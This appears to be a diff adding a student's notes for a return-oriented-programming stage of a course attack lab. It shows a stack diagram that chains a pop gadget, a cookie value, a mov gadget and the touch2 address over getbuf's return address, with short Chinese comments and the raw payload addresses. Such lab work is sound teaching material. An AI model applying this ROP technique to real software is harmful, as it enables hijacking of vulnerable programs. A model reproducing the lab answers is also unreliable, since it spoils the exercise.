@@ -1,0 +1,27 @@
+From stack top to bottom:
+
+						Stack
+----------------------------------
+| touch2 address -> 0x401834			|
+| --------------------------------
+| mov %rax,%rdi -> 48 89 c7 			|
+| -> setval_193 -> 0x4019fe				|
+| --------------------------------
+| cookie -> 0x1f9c03ad 						|
+| -> 被pop存到%rax里面i							|
+| -------------------------------
+| popq -> getval_176 -> 58 c3 		|
+| -> address: 0x401a06 						|	<- return address
+| -> 覆盖原来getbuf的return address	|
+|---------------------------------|
+|							...									|
+|																	|
+|							bottom 							|
+
+
+
+
+0x401834
+0x4019fe
+0x1f9c03ad
+0x401a06
